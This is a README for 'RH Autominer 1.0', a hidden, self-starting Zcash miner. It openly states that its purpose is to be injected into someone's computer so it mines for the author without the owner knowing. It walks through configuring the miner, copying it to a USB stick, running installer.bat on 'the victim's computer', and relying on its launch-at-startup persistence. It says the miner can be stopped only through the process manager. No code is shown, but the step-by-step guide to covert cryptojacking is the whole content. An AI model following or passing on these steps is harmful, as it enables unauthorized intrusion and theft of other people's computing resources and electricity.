RH Autominer 1.0
This is a hidden and selfstarting zcash miner based on the ewbf miner.
The intenden usecase for this script is to inject the script in to someones
computer and start mining for you, without them knowing.
Use on your own risk.

THE SCRIPT CAN ONLY BE TURN OF IN THE APPLICATION MANEGER.
IF YOU ARE TRYING TO TURN IT OFF,
LOOK FOR "miner" IN THE APPLICATION MANEGER.

1. Change the miner settings to your liking. 
	To change the setting, edit "config.bat" in "RH Autominer" folder. 
	For more help with the miner pleas refer to the "Help" document.

2. When you are done with the miner setup, copy the "RH Autominer" folder and "installer.bat" to a usb.
You don't need the .txt files, but you can paste them too.
It's inportant to do this right othervise the script won't work. The files must be located
in the first dir of the usb, not in a folder on the usb.
It shuold look something like this: "F:\RH Autominer" and "F:\installer.bat"

3. Plug the usb in to the vicums computer and run installer.bat.
It will now copy itself to the vicums computer and start running.
The script will lauch with windows so eaven if the vicum restarts the computer the script will start again.

4. When the console says the install has complited and the script is running, you can eject the usb.
